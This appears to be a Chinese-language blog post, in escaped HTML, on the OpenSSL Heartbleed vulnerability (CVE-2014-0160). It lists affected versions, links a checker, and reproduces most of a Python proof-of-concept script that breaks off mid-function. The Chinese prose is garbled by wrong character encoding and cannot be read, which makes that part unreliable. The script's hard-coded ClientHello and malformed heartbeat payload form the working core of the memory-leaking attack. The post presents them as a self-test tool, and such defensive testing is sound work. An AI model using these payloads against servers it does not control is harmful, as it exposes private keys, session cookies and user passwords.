&lt;p&gt;OpenSSL ä»Šå¤©å…¬å‘Šäº†ä¸€å€‹æ¥µåº¦åš´é‡çš„æ¼æ´ï¼ˆ&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160&quot;&gt;CVE-2014-0160&lt;/a&gt;ï¼‰ï¼Œè¢«ç¨±ç‚ºã€Œ&lt;a href=&quot;http://heartbleed.com/&quot;&gt;Heartbleed&lt;/a&gt;ã€ï¼Œè€Œä»–ç¢ºå¯¦ä¹Ÿå¦‚åŒå¿ƒè‡Ÿå™´å‡ºè¡€èˆ¬åš´é‡ã€‚é€™å€‹æ¼æ´èƒ½è®“æ”»æ“Šè€…å¾ä¼ºæœå™¨è¨˜æ†¶é«”ä¸­è®€å– 64 KB çš„è³‡æ–™ï¼Œåˆ©ç”¨å‚³é€ heartbeat çš„å°åŒ…çµ¦ä¼ºæœå™¨ï¼Œåœ¨å°åŒ…ä¸­æ§åˆ¶è®Šæ•¸å°è‡´ memcpy å‡½æ•¸è¤‡è£½éŒ¯èª¤çš„è¨˜æ†¶é«”è³‡æ–™ï¼Œå› è€Œæ“·å–è¨˜æ†¶é«”ä¸­å¯èƒ½å­˜åœ¨çš„æ©Ÿæ•è³‡æ–™ã€‚è¨˜æ†¶é«”ä¸­æœ€åš´é‡å¯èƒ½åŒ…å« ssl private keyã€session cookieã€ä½¿ç”¨è€…å¯†ç¢¼ç­‰ï¼Œå› æ­¤å¯èƒ½å› ç‚ºé€™æ¨£çš„æ¼æ´å°è‡´ä¼ºæœå™¨é­åˆ°å…¥ä¾µæˆ–å–å¾—ä½¿ç”¨è€…å¸³è™Ÿã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;è©³ç´°çš„åˆ†æå¯ä»¥åƒé–± &lt;a href=&quot;http://blog.existentialize.com/diagnosis-of-the-openssl-heartbleed-bug.html&quot;&gt;existential type crisis : Diagnosis of the OpenSSL Heartbleed Bug&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;è»Ÿé«”åç¨±ï¼šOpenSSL&lt;/li&gt;
  &lt;li&gt;å½±éŸ¿ç¯„åœï¼š1.0.1 è‡³ 1.0.1f / 1.0.2-beta ~ 1.0.2-beta1&lt;/li&gt;
  &lt;li&gt;ä¿®å¾©ç‰ˆæœ¬ï¼š1.0.1g / 1.0.2-beta2&lt;/li&gt;
  &lt;li&gt;å½±éŸ¿ç³»çµ±ç‰ˆæœ¬
    &lt;ul&gt;
      &lt;li&gt;Debian Wheezy (stable), OpenSSL 1.0.1e-2+deb7u4&lt;/li&gt;
      &lt;li&gt;Ubuntu 12.04.4 LTS, OpenSSL 1.0.1-4ubuntu5.11&lt;/li&gt;
      &lt;li&gt;CentOS 6.5, OpenSSL 1.0.1e-15&lt;/li&gt;
      &lt;li&gt;Fedora 18, OpenSSL 1.0.1e-4&lt;/li&gt;
      &lt;li&gt;OpenBSD 5.3 (OpenSSL 1.0.1c 10 May 2012) and 5.4 (OpenSSL 1.0.1c 10 May 2012)&lt;/li&gt;
      &lt;li&gt;FreeBSD 10.0 - OpenSSL 1.0.1e 11 Feb 2013&lt;/li&gt;
      &lt;li&gt;NetBSD 5.0.2 (OpenSSL 1.0.1e)&lt;/li&gt;
      &lt;li&gt;OpenSUSE 12.2 (OpenSSL 1.0.1c)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å½±éŸ¿æœå‹™ï¼šHTTPã€SMTPSã€IMAPSã€POP3S ç­‰ä½¿ç”¨ OpenSSL ä¹‹æœå‹™&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;OpenSSL çš„å…¬å‘Šå¦‚ä¸‹ï¼š&lt;a href=&quot;https://www.openssl.org/news/secadv_20140407.txt&quot;&gt;https://www.openssl.org/news/secadv_20140407.txt&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;
A missing bounds check in the handling of the TLS heartbeat extension can be
used to reveal up to 64k of memory to a connected client or server.

Only 1.0.1 and 1.0.2-beta releases of OpenSSL are affected including
1.0.1f and 1.0.2-beta1.
&lt;/pre&gt;

&lt;h3 id=&quot;å¦‚ä½•è‡ªæˆ‘æª¢æ¸¬&quot;&gt;å¦‚ä½•è‡ªæˆ‘æª¢æ¸¬ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;è¦å¦‚ä½•æ¸¬è©¦è‡ªå·±çš„ç¶²ç«™æœ‰æ²’æœ‰é€™æ¨£çš„æ¼æ´å‘¢ï¼Ÿå¯ä»¥åˆ©ç”¨ä»¥ä¸‹çš„ç¶²ç«™æˆ–å·¥å…·ç›´æ¥æŸ¥è©¢ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Heartbleed test &lt;a href=&quot;http://filippo.io/Heartbleed/&quot;&gt;http://filippo.io/Heartbleed/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç›´æ¥è¼¸å…¥ Domain å³å¯æŸ¥è©¢ï¼Œä¾‹å¦‚ã€Œfbi.govã€ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png&quot; alt=&quot;OpenSSL CVE-2014-0160 Heartbleed æª¢æ¸¬: fbi.gov&quot; title=&quot;OpenSSL CVE-2014-0160 Heartbleed æª¢æ¸¬: fbi.gov&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;è‡ªæˆ‘æ¸¬è©¦å·¥å…· &lt;a href=&quot;http://s3.jspenguin.org/ssltest.py&quot;&gt;http://s3.jspenguin.org/ssltest.py&lt;/a&gt; ï¼ˆæˆ– &lt;a href=&quot;http://pastebin.com/WmxzjkXJ&quot;&gt;http://pastebin.com/WmxzjkXJ&lt;/a&gt;ï¼‰&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä½¿ç”¨æ–¹æ³•ç›´æ¥åŸ·è¡Œã€Œpython ssltest.py ifttt.comã€ï¼Œæˆ–æ˜¯ç”¨ã€Œ-pã€æŒ‡å®šç‰¹å®š SSL é€£æ¥åŸ ã€‚ç•«é¢ä¸Šæœƒé¡¯ç¤ºå‡ºè¨˜æ†¶é«”è³‡æ–™ï¼Œå¯èƒ½å…§å«æ©Ÿæ•è³‡æ–™ä¾‹å¦‚ private keyã€session cookie ç­‰ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png&quot; alt=&quot;OpenSSL CVE-2014-0160 Heartbleed æª¢æ¸¬: ifttt.com&quot; title=&quot;OpenSSL CVE-2014-0160 Heartbleed æª¢æ¸¬: ifttt.com&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;åŸå§‹ç¢¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The author disclaims copyright to this source code.&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;select&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;optparse&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OptionParser&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OptionParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;%prog server [options]&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;Test for SSL heartbeat vulnerability (CVE-2014-0160)&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;-p&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;--port&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;int&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;TCP port to test (default: 443)&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;h2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;hello&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;16 03 02 00  dc 01 00 00 d8 03 02 53&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 0f 00 01 01                                  &lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;hb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39; &lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;18 03 02 00 03&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;01 40 00&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;lin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hxdat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%02X&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pdat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;126&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;  &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%04x&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%-48s&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hxdat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;endtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;# EOF?&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;rdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdata&lt;/span&gt;
        

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;recvmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Unexpected EOF receiving record header - server closed connection&amp;#39;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
